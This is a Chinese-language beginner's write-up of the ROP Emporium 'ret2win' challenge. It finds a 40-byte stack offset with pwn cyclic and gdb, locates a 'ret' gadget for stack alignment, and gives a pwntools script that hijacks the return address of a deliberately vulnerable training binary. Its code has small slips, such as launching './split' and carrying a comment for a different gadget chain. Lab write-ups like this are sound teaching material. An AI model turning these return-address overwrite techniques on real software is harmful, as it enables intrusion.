---
title: ret2win
published: 2026-05-11
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---


# 关于此专栏

相信对各位佬来说，这无疑是非常简单的基础rop链构造挑战——全静态，无canary，wp也是一抓一大把吧？不过作为本人入坑pwn的第一个rop链专题训练，我在这个专栏里更多地会去讲我作为新手在做这个专题过程中关于底层产生的一些疑惑以及自己的一些见解，当然也有踩过的坑。虽然很多从现在看起来很难绷，但我还是会尽量的去还原当时做题的一个状态和情况，后续如果回头有了新的见解，也有可能会进行修改，也欢迎大家一起交换见解、讨论哦！

每个人都会经历新手的过程，虽然更多地指向了技术沉淀，但如果我的blog对你有所帮助，这是在下的荣幸~

# 话不多说，进入第一题
## 确定offset

这道题我们用到的工具为pwntools、ropper、GNU Debugger、radare2

题目很贴心地提示了我们offset是40字节(x86_64)，这道题前面很多题的offset也都是40字节，所以我会省略计算offset的步骤，不过还是提一嘴吧，命令如下

```terminal
pwn cyclic -n 8 200
```

这个命令用来制造填充并造成缓冲区溢出的模式串，-n 8代表了生成的模式串每个连续的8字节的唯一性(适合64位题，刚好对应8字节地址)，200则是长度，接下来

```terminal
pwn cyclic -n 8 -l 0x某个值
```



这便是利用每8字节的唯一性来反查偏移量的指令了，我们只需在0x后加上我们要反查的那8字节模式串即可，输出即为偏移量

至于我们要反查的8字节是怎么得到的，则需要用到GNU Debugger的指令了

```terminal
gdb ./文件名    启动gdb
r               运行
```



程序启动后，放入你用pwn cyclic生成的雷霆长度的模式串，此时，栈溢出，程序毫无疑问gg了。但gdb发力了，它为你展示的，是程序崩溃前的冻结影像！所以，经过前面的填充与覆盖，你需要找到的，便是rsp此时指向的地址(我们rop链真正开始的地方，也是我们应该覆盖到的地方)。

![图片](/public/images/pwn/ROP%20Emporium/ret2win1.png)

显然其指向地址也已经被覆盖了，此时我们要做的便是将其复制，用我们的反查指令，查到偏移量。

![图片](/public/images/pwn/ROP%20Emporium/ret2win2.png)

意料之中的40呢，offset的确定就到此为止了，接下来，我们去一睹程序真容，构造payload，拿到flag！

## 查反汇编，确定目标函数，找到有用gadget

反汇编指令也提一嘴吧~

虽然看反汇编直接用IDA也不错

不过我的习惯是

```terminal
objdump -d -M intel ./文件名
```



映入你眼帘的就是各个函数的反汇编了

————你看到那个显眼包了吗？名为`ret2win`的函数，其内部还有不少可以的函数调用行为诸如call  400550 <puts@plt>、call  400560 <system@plt>，用radare2一看

```terminal
r2 -A ./ret2win
pdf @ sym.ret2win
```



果然，`system`函数准备好了，甚至是我们要的字符串参数`"/bin/cat flag.txt"`都准备好了。

![图片](/public/images/pwn/ROP%20Emporium/ret2win3.png)

那还说啥，也就是说只要我们能跳到这个函数，flag就自动出来了

## 构造脚本payload

反汇编的函数名前面能很轻易地看到函数地址，于是我们的初始脚本的payload就长这样

```python
from pwn import *

# 1. 锁定目标
p = process('./split')

# 2. 不管它输出什么中文，直接接收并丢弃，直到程序停下来等待我们输入
p.recv() 

# 3. 构造 40 字节填海造陆 + 劫持最高指挥官
# 40字节填海 + ret垫脚石(对齐栈) + ret2win()函数地址
payload = b'A' * 40 + p64(0x0000000000400756)
#从左到右依次是pop rdi;ret、/bin/cat flag.txt、ret、system@plt；
# 4. 发射火力！
p.sendline(payload)

# 5. 战术接管！这一步会把靶机连同崩溃现场，直接扔回给你眼前的终端！
p.interactive()
```
吗？

先温馨提示一下，`b''`是python自带语法，单引号是字符，双引号是字符串，而`p64()`是pwntools带的函数，很方便，会为你自动处理小端序，并且高位补零，直接把地址原封不动塞进去就好，只是别忘了最前面的0x！

话说回来，运行脚本后你会发现，成功提示出来了，但却迟迟见不到flag，这就引到了`栈对齐规则`，这个后面讲，简单来说，栈上需要16字节对齐才能保持一个相对稳定的进程状态，而函数正常调用一般会在调用时有个call指令用于保存外层函数返回地址到栈上，让rsp指向地址减8字节，再才是push rbp，又减8字节，总共减了16字节——对齐了。但我们跳过了这个指令，仅仅是push rbp，也就只减8字节，哦豁，没对齐，那么到了system()这样的关键函数的调用时，保护机制发力了，直接枪毙了你的进程

于是乎，聪明的你便想到了在这之前再用一个`ret`指令消耗8字节来达到对齐的目的,ropper便派上用场了

```teminal
ropper --file ./文件名 --search "ret(指令名)"
```

咔哒，ret指令地址映入眼帘

```terminal
0x0000000000400542: ret 0x200a; 
0x000000000040053e: ret;
```

用第二个~~(顺眼)~~，payload便变成了

```python
payload = b'A' * 40 + p64(0x000000000040053e) + p64(0x0000000000400756)
```

至于为什么ret放在前面，我们前面也说了，system这样的高级函数调用需要一个`稳定的栈状态`，其调用就在ret2win函数内,所我们要保证在来到ret2win函数之前，就把栈对齐。ok，我们再跑一下脚本逝逝

```terminal
python3 ret2win.py

[+] Starting local process './ret2win': pid 6589
[*] Switching to interactive mode
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

当当当当，flag出来了捏

此时冒出来的美元符再随便敲一下就没了，这是你的脚本在完成发送payload并接收完后续输出(直到读到EOF，也就意味着程序已经或者即将结束)后，把与程序交互(在终端对其输入，接收其输出)的权限给了你——仅仅是给了你，并不代表后续交互有效，毕竟经过栈溢出的捣乱后，程序难免会噶(不过这道题还是正常结束了hhh，详见下)，这也是为什么后续会返回：

```terminal
[*] Process './ret2win' stopped with exit code 0 (pid 6589) #程序进程结束，'0'代表正常退出
[*] Got EOF while sending in interactive #输入失败，这一般意味着输入通道关闭
```

无所谓了，反正flag拿到了就彳亍，我们更多时候不是要保证程序从头到尾都正常，而是在达到我们的目的前，要尽可能保证进程稳定，坚持到我们拿到flag或者shell之类的，过后它想咋咋



